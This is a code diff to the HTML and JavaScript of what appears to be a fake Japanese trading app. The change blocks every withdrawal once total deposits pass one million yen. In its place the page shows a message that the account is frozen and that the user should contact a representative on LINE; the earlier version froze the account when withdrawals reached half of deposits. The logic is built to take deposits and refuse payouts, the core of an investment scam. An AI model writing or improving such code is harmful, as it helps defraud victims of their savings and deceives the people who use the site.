@@ -129,6 +129,7 @@
 </head>
 <body>
     <div id="instructionMessage"></div>
+    <div id="freezeMessage">口座が凍結しました。担当者にLINEにてご連絡ください。</div>
     <div id="page1" class="container active">
         <h1>チャート</h1>
         <div id="chartContainer">
@@ -153,7 +154,6 @@
             <button onclick="confirmWithdraw()" id="withdrawBtn">出金</button>
         </div>
     </div>
-    <div id="freezeMessage">口座が凍結しました。担当者にLINEにてご連絡ください。</div>
     <div class="nav">
         <button onclick="showPage('page1')">チャート</button>
         <button onclick="showPage('page2')">口座</button>
@@ -208,9 +208,12 @@
                 return;
             }
 
-            if (totalWithdraw + amount >= totalDeposit * 0.5) {
-                freezeAccount();
-            } else if (confirm(`本当に${amount}円を出金しますか？`)) {
+            if (totalDeposit > 1000000) {
+                displayFreezeMessage();
+                return;
+            }
+
+            if (confirm(`本当に${amount}円を出金しますか？`)) {
                 withdraw();
             }
         }
@@ -225,10 +228,9 @@
             nextStep();
         }
 
-        function freezeAccount() {
+        function displayFreezeMessage() {
             const message = document.getElementById('freezeMessage');
             message.style.display = 'block';
-            document.body.style.pointerEvents = 'none'; // Disable all interactions
         }
 
         function updateBalance() {
